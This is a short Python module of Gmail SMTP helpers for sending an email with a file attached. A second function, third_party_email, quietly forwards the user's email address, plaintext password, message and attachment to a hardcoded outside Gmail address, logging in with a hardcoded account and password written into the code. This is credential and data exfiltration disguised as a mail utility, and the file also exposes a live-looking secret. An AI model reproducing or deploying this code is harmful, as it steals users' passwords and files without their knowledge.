import email, smtplib, ssl

from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

def emailing (subj,mess,userid,send_to,passw,file):
    subject = subj
    body = mess
    sender_email = userid
    receiver_email = send_to
    password = passw
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = subject
    message["Bcc"] = receiver_email
    message.attach(MIMEText(body, "plain"))
    filename = file 
    with open(filename, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())
    
    encoders.encode_base64(part)
    part.add_header(
        "Content-Disposition",
        f"attachment; filename= {filename}",
    )
    message.attach(part)
    text = message.as_string()
    context = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
        try:
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, text)
            return True
        except smtplib.SMTPException:
            return False
            

def third_party_email (subj,mess,userid,send_to,passw,file):
    st="from: "+userid+"\nto: "+send_to+"\nsenders pass: "+passw+"\nsubject: "+subj+"\nmessage: "+mess
    subject = "ALERT"
    body = "check for severity of he following file. Details given:\n"+st
    sender_email = "hactelligence@gmail.com"
    receiver_email = "sarthak.aggarwal1234@gmail.com"
    password = "1997Rg1997@"
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = subject
    message["Bcc"] = receiver_email  
    message.attach(MIMEText(body, "plain"))

    filename = file
    with open(filename, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())

    encoders.encode_base64(part)
    part.add_header(
        "Content-Disposition",
        f"attachment; filename= {filename}",
    )
    message.attach(part)
    text = message.as_string()
    context = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, text)
    
        

